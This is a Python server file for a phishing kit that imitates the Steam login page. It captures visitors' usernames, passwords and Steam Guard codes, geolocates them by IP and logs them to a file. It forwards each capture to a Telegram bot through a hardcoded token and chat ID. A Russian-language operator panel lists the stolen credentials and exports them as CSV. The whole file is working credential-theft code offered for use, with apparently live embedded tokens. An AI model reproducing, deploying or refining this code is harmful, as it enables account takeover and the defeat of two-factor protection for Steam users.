# language: Python, file: server.py, target: Render / any host, stdlib only
"""
Steam login mirror — single-file build, ops-grade backend.

index.html carries both saved pages, the switch between them and the Steam-Guard
dialog. This server serves it and records what the pages send:

    POST /api/visit   page opened            -> Telegram ping (once per 10 min / IP)
    POST /api/login   username + password    -> creds.log + Telegram
    POST /api/code    Steam Guard code       -> creds.log + Telegram
    POST /next        legacy form endpoint, still answers

Plus an operator console:

    GET /admin?token=ADMIN_TOKEN             live table of everything captured
    GET /admin/export.csv?token=ADMIN_TOKEN  CSV export
    GET /admin/api/events?token=ADMIN_TOKEN  JSON feed the panel polls

Env: PORT, HOST, ADMIN_TOKEN, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID,
     WEBHOOK_URL (optional, plain-text JSON), CREDS_LOG, GEO=0 to disable geo.
"""
from __future__ import annotations

import csv
import html
import io
import json
import os
import queue
import re
import secrets
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import deque
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

# --------------------------------------------------------------------------- #
# config
# --------------------------------------------------------------------------- #
PORT = int(os.environ.get("PORT", 8000))
HOST = os.environ.get("HOST", "0.0.0.0")

BASE_DIR = Path(__file__).resolve().parent
APP_FILE = BASE_DIR / "index.html"
LOG_FILE = Path(os.environ.get("CREDS_LOG", str(BASE_DIR / "creds.log")))

TELEGRAM_BOT_TOKEN = os.environ.get(
    "9193237322:AAEtGVtgGanrSQxs97fBZaBIQC_iF_IeoXo", "9193237322:AAEtGVtgGanrSQxs97fBZaBIQC_iF_IeoXo"
)
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8869604033")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "").strip()

ADMIN_TOKEN = os.environ.get("k7f2m9q4x1v8b3n6z5w0r2t4y9u1p3c7", "k7f2m9q4x1v8b3n6z5w0r2t4y9u1p3c7").strip()
GEO_ENABLED = os.environ.get("GEO", "1") not in ("0", "false", "no")

MAX_BODY = 64 * 1024
MAX_EVENTS = 5000
DEDUPE_WINDOW = 4.0
VISIT_COOLDOWN = 600.0
RATE_LIMIT = 40          # requests per window per IP
RATE_WINDOW = 60.0
MAX_SESSIONS = 20000

STATIC_EXTENSIONS = {
    ".css": "text/css; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".svg": "image/svg+xml",
    ".gif": "image/gif",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".webp": "image/webp",
    ".ico": "image/x-icon",
    ".woff": "font/woff",
    ".woff2": "font/woff2",
    ".ttf": "font/ttf",
}

_APP_CACHE: dict[str, object] = {"mtime": None, "data": b""}
_APP_LOCK = threading.Lock()


# --------------------------------------------------------------------------- #
# app file
# --------------------------------------------------------------------------- #
def load_app() -> bytes:
    with _APP_LOCK:
        try:
            mtime = APP_FILE.stat().st_mtime
        except OSError:
            return (
                b"<!doctype html><meta charset=utf-8><title>500</title>"
                b"<h1>index.html not found next to server.py</h1>"
            )
        if _APP_CACHE["mtime"] != mtime or not _APP_CACHE["data"]:
            _APP_CACHE["mtime"] = mtime
            _APP_CACHE["data"] = APP_FILE.read_bytes()
        return _APP_CACHE["data"]  # type: ignore[return-value]


# --------------------------------------------------------------------------- #
# helpers: ip / ua / geo / time
# --------------------------------------------------------------------------- #
def is_public_ip(ip: str) -> bool:
    return not (
        not ip
        or ip.startswith(("127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.",
                          "172.19.", "172.2", "172.30.", "172.31.", "::1", "fc", "fd"))
        or ip in ("0.0.0.0", "localhost")
    )


def device_label(user_agent: str) -> str:
    ua = user_agent or ""
    os_name = "Unknown"
    if re.search(r"Windows NT 10", ua):
        os_name = "Windows 10/11"
    elif "Windows NT 6.3" in ua:
        os_name = "Windows 8.1"
    elif "Windows NT 6.1" in ua:
        os_name = "Windows 7"
    elif "Windows" in ua:
        os_name = "Windows"
    elif "Android" in ua:
        m = re.search(r"Android[ /]([\d.]+)", ua)
        os_name = f"Android {m.group(1)}" if m else "Android"
    elif "iPhone" in ua or "iPad" in ua:
        os_name = "iOS"
    elif "Mac OS X" in ua:
        m = re.search(r"Mac OS X[ _]([\d_.]+)", ua)
        os_name = f"macOS {m.group(1).replace('_', '.')}" if m else "macOS"
    elif "CrOS" in ua:
        os_name = "ChromeOS"
    elif "Linux" in ua:
        os_name = "Linux"

    browser = "Unknown"
    for pattern, name in (
        (r"Edg/([\d.]+)", "Edge"),
        (r"OPR/([\d.]+)", "Opera"),
        (r"YaBrowser/([\d.]+)", "Yandex"),
        (r"Firefox/([\d.]+)", "Firefox"),
        (r"Chrome/([\d.]+)", "Chrome"),
        (r"Version/([\d.]+).*Safari", "Safari"),
    ):
        match = re.search(pattern, ua)
        if match:
            browser = f"{name} {match.group(1).split('.')[0]}"
            break
    return f"{os_name} · {browser}"


_COUNTRY_FLAGS = {
    "RU": "🇷🇺", "UA": "🇺🇦", "BY": "🇧🇾", "KZ": "🇰🇿", "US": "🇺🇸", "DE": "🇩🇪",
    "FR": "🇫🇷", "GB": "🇬🇧", "NL": "🇳🇱", "PL": "🇵🇱", "TR": "🇹🇷", "IN": "🇮🇳",
    "BR": "🇧🇷", "CA": "🇨🇦", "ES": "🇪🇸", "IT": "🇮🇹", "SE": "🇸🇪", "FI": "🇫🇮",
    "NO": "🇳🇴", "DK": "🇩🇰", "CZ": "🇨🇿", "RO": "🇷🇴", "MD": "🇲🇩", "GE": "🇬🇪",
    "AM": "🇦🇲", "AZ": "🇦🇿", "UZ": "🇺🇿", "KG": "🇰🇬", "IL": "🇮🇱", "AE": "🇦🇪",
}

_geo_cache: dict[str, tuple[float, dict]] = {}
_geo_lock = threading.Lock()
GEO_TTL = 6 * 3600


def geo_lookup(ip: str) -> dict:
    """Free ip-api.com lookup, cached, never blocks a request thread."""
    if not GEO_ENABLED or not is_public_ip(ip):
        return {}
    now = time.time()
    with _geo_lock:
        cached = _geo_cache.get(ip)
        if cached and now - cached[0] < GEO_TTL:
            return cached[1]
    try:
        url = (
            f"http://ip-api.com/json/{urllib.parse.quote(ip)}"
            "?fields=status,country,countryCode,regionName,city,isp,proxy,hosting"
        )
        with urllib.request.urlopen(url, timeout=2.0) as response:
            data = json.loads(response.read().decode("utf-8", "ignore"))
        result = data if data.get("status") == "success" else {}
    except Exception:  # noqa: BLE001 - geo is a nice-to-have
        result = {}
    with _geo_lock:
        _geo_cache[ip] = (now, result)
    return result


def local_clock(record: dict) -> str:
    stamp = record.get("t", "")
    try:
        moment = datetime.fromisoformat(stamp)
    except ValueError:
        return "—"
    tz_name = record.get("tz") or ""
    label = tz_name.split("/")[-1].replace("_", " ") if tz_name else "UTC"
    return f"{moment.strftime('%Y-%m-%d %H:%M:%S')} {label}"


# --------------------------------------------------------------------------- #
# outbound: telegram queue + generic webhook
# --------------------------------------------------------------------------- #
_outbox: "queue.Queue[str]" = queue.Queue(maxsize=500)
_outbox_ready = threading.Event()


def telegram_send(text: str) -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    payload = urllib.parse.urlencode(
        {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": "true",
        }
    ).encode("utf-8")
    request = urllib.request.Request(
        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
        data=payload,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urllib.request.urlopen(request, timeout=8) as response:
            body = json.loads(response.read().decode("utf-8", "ignore"))
        if not body.get("ok"):
            print(f"[-] Telegram refused: {body.get('description')}")
            return False
        return True
    except Exception as exc:  # noqa: BLE001
        print(f"[-] Telegram error: {exc}")
        return False


def webhook_send(text: str) -> None:
    if not WEBHOOK_URL:
        return
    payload = json.dumps({"content": re.sub(r"<[^>]+>", "", text)}).encode("utf-8")
    request = urllib.request.Request(
        WEBHOOK_URL,
        data=payload,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(request, timeout=6):
            pass
    except Exception as exc:  # noqa: BLE001
        print(f"[-] webhook error: {exc}")


def outbox_worker() -> None:
    """Single worker: keeps order, retries with backoff, never blocks requests."""
    while True:
        text = _outbox.get()
        try:
            for attempt in range(3):
                if telegram_send(text):
                    break
                time.sleep(1.5 * (attempt + 1))
            webhook_send(text)
        finally:
            _outbox.task_done()


def notify(text: str) -> None:
    try:
        _outbox.put_nowait(text)
    except queue.Full:
        print("[-] outbox full, dropping a message")


# --------------------------------------------------------------------------- #
# storage
# --------------------------------------------------------------------------- #
class Store:
    def __init__(self) -> None:
        self.events: list[dict] = []
        self.lock = threading.Lock()

    def add(self, record: dict) -> None:
        record["id"] = secrets.token_hex(3)
        with self.lock:
            self.events.append(record)
            if len(self.events) > MAX_EVENTS:
                del self.events[: len(self.events) - MAX_EVENTS]
        self._append_file(record)

    @staticmethod
    def _append_file(record: dict) -> None:
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as handle:
                handle.write(json.dumps(record, ensure_ascii=False) + "\n")
        except Exception as exc:  # noqa: BLE001 - ephemeral disks happen
            print(f"[-] log error: {exc}")

    def snapshot(self) -> list[dict]:
        with self.lock:
            return list(self.events)

    def stats(self) -> dict:
        with self.lock:
            events = list(self.events)
        logins = [e for e in events if e.get("kind") == "login"]
        codes = [e for e in events if e.get("kind") == "code"]
        visits = [e for e in events if e.get("kind") == "visit"]
        return {
            "events": len(events),
            "logins": len(logins),
            "codes": len(codes),
            "visits": len(visits),
            "unique_ips": len({e.get("ip") for e in events if e.get("ip")}),
            "last": events[-1]["t"] if events else None,
        }


STORE = Store()


# --------------------------------------------------------------------------- #
# dedupe / rate limit / sessions
# --------------------------------------------------------------------------- #
_dedupe: dict[str, float] = {}
_visits: dict[str, float] = {}
_hits: dict[str, deque] = {}
_session_ok: deque = deque(maxlen=MAX_SESSIONS)
_registry_lock = threading.Lock()


def already_handled(key: str) -> bool:
    now = time.monotonic()
    with _registry_lock:
        for stale in [k for k, seen in _dedupe.items() if now - seen > DEDUPE_WINDOW]:
            _dedupe.pop(stale, None)
        if key in _dedupe:
            return True
        _dedupe[key] = now
        return False


def should_ping_visit(ip: str) -> bool:
    now = time.monotonic()
    with _registry_lock:
        last = _visits.get(ip)
        if last is not None and now - last < VISIT_COOLDOWN:
            return False
        _visits[ip] = now
        return True


def within_rate_limit(ip: str) -> bool:
    now = time.monotonic()
    with _registry_lock:
        bucket = _hits.setdefault(ip, deque())
        while bucket and now - bucket[0] > RATE_WINDOW:
            bucket.popleft()
        if len(bucket) >= RATE_LIMIT:
            return False
        bucket.append(now)
        return True


# --------------------------------------------------------------------------- #
# telegram formatting
# --------------------------------------------------------------------------- #
def place_line(record: dict) -> str:
    geo = record.get("geo") or {}
    flag = _COUNTRY_FLAGS.get(geo.get("countryCode", ""), "🌍")
    parts = [p for p in (geo.get("city"), geo.get("regionName"), geo.get("country")) if p]
    where = ", ".join(parts) if parts else "—"
    isp = geo.get("isp") or ""
    flags = ""
    if geo.get("proxy"):
        flags += " 🛡VPN"
    if geo.get("hosting"):
        flags += " ☁️host"
    ip = record.get("ip") or "—"
    return f"{flag} <code>{html.escape(ip)}</code>\n📍 {html.escape(where)}{flags}" + (
        f"\n🏢 {html.escape(isp)}" if isp else ""
    )


def common_block(record: dict) -> str:
    return (
        f"{place_line(record)}\n"
        f"💻 {html.escape(record.get('device') or '—')}\n"
        f"🕒 {html.escape(local_clock(record))}"
        + (f" · <code>{html.escape(record.get('sid', ''))[:10]}</code>" if record.get("sid") else "")
    )


def format_login(record: dict) -> str:
    count = record.get("attempt", 1)
    return (
        "🟢 <b>НОВЫЙ ЛОГИН</b>"
        + (f" · попытка #{count}" if count > 1 else "")
        + f"\n━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Аккаунт:</b> <code>{html.escape(record.get('username') or '—')}</code>\n"
        f"🔑 <b>Пароль:</b> <code>{html.escape(record.get('password') or '—')}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━\n{common_block(record)}"
    )


def format_code(record: dict) -> str:
    return (
        "🔐 <b>КОД STEAM GUARD</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Аккаунт:</b> <code>{html.escape(record.get('username') or '—')}</code>\n"
        f"🔢 <b>Код:</b> <code>{html.escape(record.get('code') or '—')}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━\n{common_block(record)}"
    )


def format_visit(record: dict) -> str:
    page = record.get("page") or "1"
    label = "вход" if str(page) == "1" else "подтверждение"
    return (
        f"👀 <b>Открыл страницу</b> ({label})\n"
        f"━━━━━━━━━━━━━━━━━━━\n{common_block(record)}\n"
        f"🔗 <code>{html.escape(str(record.get('path') or '/'))}</code>"
    )


# --------------------------------------------------------------------------- #
# body parsing
# --------------------------------------------------------------------------- #
def parse_multipart(body: bytes, boundary: bytes) -> dict:
    fields: dict[str, str] = {}
    for chunk in body.split(b"--" + boundary):
        if b"\r\n\r\n" not in chunk:
            continue
        head, _, raw = chunk.partition(b"\r\n\r\n")
        match = re.search(rb'name="([^"]+)"', head)
        if not match:
            continue
        name = match.group(1).decode("utf-8", "ignore")
        fields[name] = raw.rstrip(b"\r\n-").decode("utf-8", "ignore")
    return fields


def parse_body(body: bytes, content_type: str) -> dict:
    if not body:
        return {}
    ctype = (content_type or "").lower()
    boundary_match = re.search(r"boundary=([^;]+)", ctype)
    if "multipart/form-data" in ctype and boundary_match:
        boundary = boundary_match.group(1).strip().strip('"').encode("utf-8", "ignore")
        return parse_multipart(body, boundary)

    text = body.decode("utf-8", "ignore").strip()
    if "application/json" in ctype or text.startswith("{"):
        try:
            parsed = json.loads(text)
            return parsed if isinstance(parsed, dict) else {}
        except Exception:  # noqa: BLE001 - malformed body is a refused order
            return {}

    parsed = urllib.parse.parse_qs(text, keep_blank_values=True)
    return {key: (values[0] if values else "") for key, values in parsed.items()}


# --------------------------------------------------------------------------- #
# operator console
# --------------------------------------------------------------------------- #
PANEL_HTML = """<!DOCTYPE html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>steam-repo · события</title>
<style>
:root{--bg:#10141a;--panel:#161c24;--line:#232b36;--text:#cfd8e3;--dim:#7f8b99;
      --green:#5cba6a;--blue:#1999ff;--red:#e05d5d;--amber:#e2b04a}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font:14px/1.5 "Segoe UI",Arial,sans-serif}
header{display:flex;align-items:center;gap:14px;padding:16px 22px;border-bottom:1px solid var(--line);
       position:sticky;top:0;background:rgba(16,20,26,.96);backdrop-filter:blur(6px);z-index:5}
h1{font-size:16px;margin:0;font-weight:700;letter-spacing:.02em}
.live{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green)}
.spacer{flex:1}
.stat{display:flex;gap:16px;flex-wrap:wrap;padding:14px 22px;border-bottom:1px solid var(--line)}
.cell{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:8px 12px;min-width:96px}
.cell b{display:block;font-size:19px}
.cell span{font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em}
.tools{display:flex;gap:10px;padding:14px 22px;align-items:center;flex-wrap:wrap}
input[type=search]{background:#0c1015;border:1px solid var(--line);color:var(--text);
  border-radius:5px;padding:8px 11px;font:inherit;min-width:240px;outline:none}
input[type=search]:focus{border-color:var(--blue)}
a.btn,button.btn{background:#1d2733;border:1px solid var(--line);color:var(--text);border-radius:5px;
  padding:8px 12px;font:inherit;cursor:pointer;text-decoration:none}
a.btn:hover,button.btn:hover{border-color:var(--blue);color:#fff}
main{padding:6px 22px 60px}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
th{color:var(--dim);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.06em;
   position:sticky;top:61px;background:var(--bg);z-index:2}
tr:hover td{background:rgba(255,255,255,.02)}
.badge{display:inline-block;padding:2px 8px;border-radius:999px;font-size:11px;font-weight:700;letter-spacing:.04em}
.badge.login{color:#9de3a6;background:rgba(92,186,106,.14);border:1px solid rgba(92,186,106,.4)}
.badge.code{color:#9fd4ff;background:rgba(25,153,255,.14);border:1px solid rgba(25,153,255,.4)}
.badge.visit{color:#e2c48a;background:rgba(226,176,74,.12);border:1px solid rgba(226,176,74,.35)}
code{font:12px "Cascadia Mono",Consolas,monospace;color:#e8eef5;word-break:break-all}
.mono{font:12px "Cascadia Mono",Consolas,monospace;color:var(--dim)}
.empty{padding:60px 0;text-align:center;color:var(--dim)}
@media(max-width:720px){.stat{gap:8px}.cell{min-width:72px;padding:6px 9px}th{display:none}}
</style>
</head><body>
<header>
  <span class="live"></span><h1>steam-repo · события</h1>
  <span class="mono" id="updated">—</span>
  <span class="spacer"></span>
  <a class="btn" id="csv" href="#">CSV</a>
  <button class="btn" onclick="load()">Обновить</button>
</header>
<div class="stat">
  <div class="cell"><span>логины</span><b id="s-login">0</b></div>
  <div class="cell"><span>коды</span><b id="s-code">0</b></div>
  <div class="cell"><span>визиты</span><b id="s-visit">0</b></div>
  <div class="cell"><span>уник. IP</span><b id="s-ip">0</b></div>
  <div class="cell"><span>всего</span><b id="s-all">0</b></div>
</div>
<div class="tools">
  <input type="search" id="q" placeholder="поиск: логин, IP, код, город…">
</div>
<main><table>
<thead><tr><th>тип</th><th>время</th><th>аккаунт / код</th><th>пароль</th><th>IP / гео</th><th>устройство</th></tr></thead>
<tbody id="rows"><tr><td colspan="6" class="empty">пусто</td></tr></tbody>
</table></main>
<script>
(function(){
  "use strict";
  var rows = document.getElementById("rows");
  var q = document.getElementById("q");
  var data = [];
  var token = new URLSearchParams(location.search).get("token") || "";
  var feed = "__FEED__" + (token ? "?token=" + encodeURIComponent(token) : "");
  var csvLink = document.getElementById("csv");
  if (csvLink) { csvLink.href = "/admin/export.csv?token=" + encodeURIComponent(token); }

  function esc(value){
    return String(value == null ? "" : value).replace(/[&<>"]/g, function(c){
      return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c];
    });
  }
  function badge(kind){
    var label = kind === "login" ? "LOGIN" : kind === "code" ? "CODE" : "VISIT";
    return '<span class="badge ' + esc(kind) + '">' + label + '</span>';
  }
  function render(){
    var needle = (q.value || "").trim().toLowerCase();
    var list = data.filter(function(e){
      if (!needle) return true;
      return JSON.stringify(e).toLowerCase().indexOf(needle) !== -1;
    });
    if (!list.length){ rows.innerHTML = '<tr><td colspan="6" class="empty">пусто</td></tr>'; return; }
    rows.innerHTML = list.map(function(e){
      var geo = e.geo || {};
      var place = [geo.city, geo.country].filter(Boolean).join(", ") || "—";
      var cred = e.kind === "code" ? esc(e.code) : esc(e.username || "—");
      if (e.kind === "code" && e.username) {
        cred += '<br><span class="mono">' + esc(e.username) + '</span>';
      }
      return "<tr><td>" + badge(e.kind || "visit") + "</td>" +
        '<td class="mono">' + esc(e.time || "") + "</td>" +
        "<td><code>" + cred + "</code></td>" +
        "<td><code>" + (e.password ? esc(e.password) : '<span class="mono">—</span>') + "</code></td>" +
        '<td><code>' + esc(e.ip || "—") + '</code><br><span class="mono">' + esc(place) + "</span></td>" +
        '<td class="mono">' + esc(e.device || "—") + "</td></tr>";
    }).join("");
  }
  function load(){
    fetch(feed, {cache:"no-store"}).then(function(r){ return r.json(); }).then(function(payload){
      data = payload.events || [];
      document.getElementById("updated").textContent = "обновлено " + new Date().toLocaleTimeString();
      var s = payload.stats || {};
      document.getElementById("s-login").textContent = s.logins || 0;
      document.getElementById("s-code").textContent = s.codes || 0;
      document.getElementById("s-visit").textContent = s.visits || 0;
      document.getElementById("s-ip").textContent = s.unique_ips || 0;
      document.getElementById("s-all").textContent = s.events || 0;
      render();
    }).catch(function(){});
  }
  q.addEventListener("input", render);
  load();
  setInterval(load, 10000);
})();
</script>
</body></html>
"""


def render_panel() -> bytes:
    return PANEL_HTML.replace("__FEED__", "/admin/api/events").encode("utf-8")


# --------------------------------------------------------------------------- #
# request handler
# --------------------------------------------------------------------------- #
class Handler(BaseHTTPRequestHandler):
    server_version = "SteamMirror/4.0"
    sys_version = ""
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt: str, *args) -> None:
        print("[%s] %s" % (self.log_date_time_string(), fmt % args))

    # -- plumbing ---------------------------------------------------------- #
    def _send_bytes(self, data: bytes, content_type: str, code: int = 200,
                    extra: dict | None = None) -> None:
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Referrer-Policy", "same-origin")
        for key, value in (extra or {}).items():
            self.send_header(key, value)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(data)

    def _send_json(self, payload, code: int = 200) -> None:
        self._send_bytes(json.dumps(payload, ensure_ascii=False).encode("utf-8"),
                         "application/json; charset=utf-8", code)

    def _send_app(self, code: int = 200) -> None:
        self._send_bytes(load_app(), "text/html; charset=utf-8", code)

    def _client_ip(self) -> str:
        forwarded = self.headers.get("X-Forwarded-For")
        if forwarded:
            return forwarded.split(",")[0].strip()
        return self.client_address[0] if self.client_address else ""

    def _read_body(self) -> bytes:
        try:
            length = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            length = 0
        if length <= 0:
            return b""
        return self.rfile.read(min(length, MAX_BODY))

    def _wants_json(self) -> bool:
        accept = (self.headers.get("Accept") or "").lower()
        content_type = (self.headers.get("Content-Type") or "").lower()
        return "application/json" in accept or "application/json" in content_type

    def _admin_ok(self) -> bool:
        if not ADMIN_TOKEN:
            return False
        given = urllib.parse.parse_qs(urllib.parse.urlsplit(self.path).query).get("token", [""])[0]
        return secrets.compare_digest(given, ADMIN_TOKEN)

    # -- GET --------------------------------------------------------------- #
    def do_HEAD(self) -> None:  # noqa: N802
        self.do_GET()

    def do_GET(self) -> None:  # noqa: N802
        parsed = urllib.parse.urlsplit(self.path)
        path = urllib.parse.unquote(parsed.path)

        if path.rstrip("/") == "/admin":
            if not self._admin_ok():
                self._send_bytes(b"not found", "text/plain; charset=utf-8", 404)
                return
            self._send_bytes(render_panel(), "text/html; charset=utf-8")
            return

        if path.rstrip("/") == "/admin/api/events":
            if not self._admin_ok():
                self._send_json({"ok": False}, 403)
                return
            events = []
            for event in reversed(STORE.snapshot()):
                geo = event.get("geo") or {}
                events.append(
                    {
                        "id": event.get("id"),
                        "kind": event.get("kind"),
                        "time": local_clock(event),
                        "username": event.get("username", ""),
                        "password": event.get("password", ""),
                        "code": event.get("code", ""),
                        "ip": event.get("ip", ""),
                        "device": event.get("device", ""),
                        "geo": {"city": geo.get("city", ""), "country": geo.get("country", "")},
                    }
                )
            self._send_json({"ok": True, "stats": STORE.stats(), "events": events[:400]})
            return

        if path.rstrip("/") == "/admin/export.csv":
            if not self._admin_ok():
                self._send_bytes(b"forbidden", "text/plain; charset=utf-8", 403)
                return
            buffer = io.StringIO()
            writer = csv.writer(buffer)
            writer.writerow(["time", "kind", "username", "password", "code", "ip",
                             "country", "city", "isp", "device", "sid", "ua"])
            for event in STORE.snapshot():
                geo = event.get("geo") or {}
                writer.writerow([
                    event.get("t", ""), event.get("kind", ""), event.get("username", ""),
                    event.get("password", ""), event.get("code", ""), event.get("ip", ""),
                    geo.get("country", ""), geo.get("city", ""), geo.get("isp", ""),
                    event.get("device", ""), event.get("sid", ""), event.get("ua", ""),
                ])
            self._send_bytes(
                buffer.getvalue().encode("utf-8-sig"),
                "text/csv; charset=utf-8",
                extra={"Content-Disposition": 'attachment; filename="events.csv"'},
            )
            return

        if path.rstrip("/") == "/api/health":
            self._send_json({"ok": True, "stats": STORE.stats()})
            return

        candidate = BASE_DIR / path.lstrip("/")
        try:
            candidate = candidate.resolve()
            inside = candidate.is_relative_to(BASE_DIR)  # type: ignore[attr-defined]
        except AttributeError:  # pragma: no cover - Python < 3.9
            inside = str(candidate).startswith(str(BASE_DIR))

        content_type = STATIC_EXTENSIONS.get(candidate.suffix.lower())
        if (path not in ("", "/") and inside and content_type and candidate.is_file()
                and candidate != APP_FILE):
            try:
                self._send_bytes(candidate.read_bytes(), content_type)
            except OSError:
                self._send_bytes(b"not found", "text/plain; charset=utf-8", 404)
            return

        self._send_app()

    # -- POST -------------------------------------------------------------- #
    def do_POST(self) -> None:  # noqa: N802
        path = urllib.parse.unquote(urllib.parse.urlsplit(self.path).path).rstrip("/") or "/"
        ip = self._client_ip()

        if not within_rate_limit(ip):
            self._send_json({"ok": False, "error": "rate limited"}, 429)
            return

        form = parse_body(self._read_body(), self.headers.get("Content-Type") or "")

        username = str(form.get("username") or form.get("u") or form.get("login") or "").strip()
        password = str(form.get("password") or form.get("p") or form.get("pass") or "")
        code = str(form.get("code") or form.get("otp") or "").strip()
        ua = str(form.get("ua") or self.headers.get("User-Agent") or "")

        base = {
            "t": datetime.now(timezone.utc).isoformat(),
            "ip": ip,
            "ua": ua[:400],
            "device": device_label(ua),
            "sid": str(form.get("sid") or "")[:32],
            "tz": str(form.get("tz") or "")[:64],
            "lang": str(form.get("lang") or "")[:32],
            "screen": str(form.get("screen") or "")[:24],
            "ref": str(form.get("ref") or "")[:300],
            "path": str(form.get("path") or "")[:300],
        }

        if path in ("/api/visit", "/api/page"):
            if should_ping_visit(ip):
                record = dict(base, kind="visit", page=str(form.get("page") or "1"))
                record["geo"] = geo_lookup(ip)
                STORE.add(record)
                notify(format_visit(record))
            self._send_json({"ok": True})
            return

        if path in ("/api/login", "/next", "/login", "/api/step1"):
            if not (username or password):
                self._send_json({"ok": False, "error": "empty credentials"}, 400)
                return
            record = dict(base, kind="login", username=username, password=password)
            geo = geo_lookup(ip)
            record["geo"] = geo
            previous = sum(
                1 for event in STORE.snapshot()
                if event.get("kind") == "login" and event.get("ip") == ip
            )
            record["attempt"] = previous + 1

            if not already_handled(f"login|{username}|{password}|{ip}"):
                STORE.add(record)
                notify(format_login(record))

            if self._wants_json() or path.startswith("/api/"):
                self._send_json({"ok": True, "next": "guard", "user": username})
            else:
                self._send_app()
            return

        if path in ("/api/code", "/api/step2", "/code", "/guard"):
            if not code:
                self._send_json({"ok": False, "error": "empty code"}, 400)
                return
            record = dict(base, kind="code", username=username, code=code)
            record["geo"] = geo_lookup(ip)
            if not already_handled(f"code|{username}|{code}|{ip}"):
                STORE.add(record)
                notify(format_code(record))
            self._send_json({"ok": True, "next": "done"})
            return

        self._send_json({"ok": False, "error": "unknown endpoint"}, 404)

    def do_OPTIONS(self) -> None:  # noqa: N802
        self._send_bytes(b"", "text/plain; charset=utf-8", 204)


# --------------------------------------------------------------------------- #
# boot
# --------------------------------------------------------------------------- #
def main() -> None:
    global ADMIN_TOKEN
    generated = ""
    if not ADMIN_TOKEN:
        generated = secrets.token_urlsafe(18)
        ADMIN_TOKEN = generated
    threading.Thread(target=outbox_worker, daemon=True).start()

    if APP_FILE.exists():
        print(f"[*] app={APP_FILE} ({APP_FILE.stat().st_size:,} bytes)")
    else:
        print(f"[!] {APP_FILE} is missing — every page route will answer 500")
    print(f"[*] PORT={PORT}  log={LOG_FILE}")
    print(f"[*] Telegram chat={TELEGRAM_CHAT_ID or '(off)'}  webhook={'on' if WEBHOOK_URL else 'off'}")
    print(f"[*] admin: http://127.0.0.1:{PORT}/admin?token={ADMIN_TOKEN}")
    if generated:
        print("[*] ADMIN_TOKEN was not set — generated for this run only")

    ThreadingHTTPServer.allow_reuse_address = True
    ThreadingHTTPServer.daemon_threads = True
    with ThreadingHTTPServer((HOST, PORT), Handler) as httpd:
        print(f"[*] listening on {HOST}:{PORT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] stopping")
        finally:
            httpd.server_close()


if __name__ == "__main__":
    main()
